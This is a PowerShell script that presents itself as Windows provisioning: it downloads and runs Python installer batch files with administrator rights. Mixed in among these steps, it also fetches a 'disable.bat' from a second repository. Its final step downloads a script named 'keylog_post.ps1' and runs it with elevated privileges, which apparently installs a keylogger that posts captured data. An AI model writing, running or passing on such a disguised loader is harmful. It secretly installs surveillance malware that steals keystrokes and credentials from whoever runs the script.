$tempFolder = New-Item -ItemType Directory -Path "$env:TEMP\ProvisionWindows" -Force
$installPythonBatUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python.bat"
$installPythonBatPath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python.bat"
$batFileDisabler = "https://raw.githubusercontent.com/FanAPIpipa/pipa/main/disable.bat" 
$batFileDisablerPath = Join-Path -Path $tempFolder.FullName -ChildPath "disable.bat"
$installPythonToolsBatUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python-tools.bat"
$installPythonToolsBatPath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python-tools.bat"

$batFileUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python.bat"
$batFilePath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python.bat"

Invoke-WebRequest -Uri $installPythonBatUrl -OutFile $installPythonBatPath
Invoke-WebRequest -Uri $batFileDisabler -OutFile $batFileDisablerPath
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonBatPath" -Verb RunAs -Wait
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonBatPath" -Verb RunAs -Wait
Invoke-WebRequest -Uri $installPythonToolsBatUrl -OutFile $installPythonToolsBatPath
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonToolsBatPath" -Wait
Invoke-WebRequest -Uri $batFileUrl -OutFile $batFilePath
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $batFilePath" -Verb RunAs -Wait
$fgapeScriptUrl = "https://raw.github.com/FanAPIpipa/pipa/raw/main/keylog_post.ps1"
$fgapeScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "keylog_post.ps1"
Invoke-WebRequest -Uri $fgapeScriptUrl -OutFile $fgapeScriptPath
Start-Process -FilePath "powershell.exe" -ArgumentList "-File $fgapeScriptPath" -Verb RunAs -Wait
